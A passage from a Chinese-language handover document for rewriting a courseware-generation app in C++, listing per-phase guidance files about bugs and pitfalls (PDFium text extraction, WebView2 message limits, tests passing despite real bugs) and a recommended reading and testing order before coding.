>   （其中 **3 项是判据全绿时存在的真 bug**）、以及我自己犯的 8 类错。
> - [`guidance3.md`](guidance3.md) —— Phase 2 的过程：
>   PDFium 逐字符取数踩到的六个坑（0xA0 续字节、代理项对、advance vs 包围盒、PUA 项目符号、
>   栏缝误判、公式页顺序）、三路互验审出的五类假绿（含"两页整页文字消失仍全绿"）、
>   我自己犯的 10 类错，以及"如果换我接手会先做这几件事"。
> - [`guidance5.md`](guidance5.md) —— Phase 3 的过程：
>   "产物写出来了、任务却永远 pending"（消息少了一个 `kind`）、`.value()` 用在字符串上
>   直接 0xC0000409、取消最终变成 failed、大快照超过 WebView2 单条消息上限、
>   首次「测试连接」必失败；以及三路互验后的修复。
> - [`guidance6.md`](guidance6.md) —— Phase 4 的过程：
>   `editedPages` 在到达流水线前被削掉、工作台选项字段名没归一、大回包不分块导致
>   永久挂起、bundle 过期；以及"测试输入要贴近真实调用方"。
> - [`guidance7.md`](guidance7.md) —— **Phase 5 + 6 的过程（最新，先读这一份）**：
>   原始字符串少一个 `)` 让 DOM 快照静默变空、demo 对象被当成 checks 数组、
>   demo 核对把用户的成品页面删了、oracle 的演示核对在多章改造后整轮失效；
>   以及"删除逻辑必须知道这个文件是谁的"。
> - [`guidance4.md`](guidance4.md) —— 这两阶段的**合并摘要**（三路互验的完整修复清单）。

**不要从写代码开始。** 按这个顺序：

1. 读 `architecture.md`（接口）、`generation-contract.md`（模型契约）、`SKILL.md`（页面规范）——**这三份是规格书**。
   活的那份纲领（本文件）在 `apps/isg-studio-cpp/docs/`，**三份规格书仍在 `apps/isg-studio/docs/` 与
   `skills/` 下、不复制**——理由与"打包时从哪拷到哪"见 `apps/isg-studio-cpp/docs/README.md`；
2. 跑一次现有应用（`npm start`），拿一份真课件完整生成一遍，**亲眼看一遍八个阶段与十一项报告**——
   你要重写的是这个体验，不是这些文件；
3. 跑 `npm run selftest` 和 `npx electron test/e2e-mock.js`，看懂这个项目怎么证明自己没坏；
4. **然后才写 Phase 0 的那个 spike**（§5）。
5. Phase 0 的结论**写回这份文档**（把估计值替换成实测值），再决定 Phase 1 怎么排。

最后一句：这个项目最贵的不是代码量，是**那些被用户否掉的方案和踩过的坑**（`pitfalls.md`）。
重写时你的首要任务不是"写得更好"，而是**"一个都不丢"**。
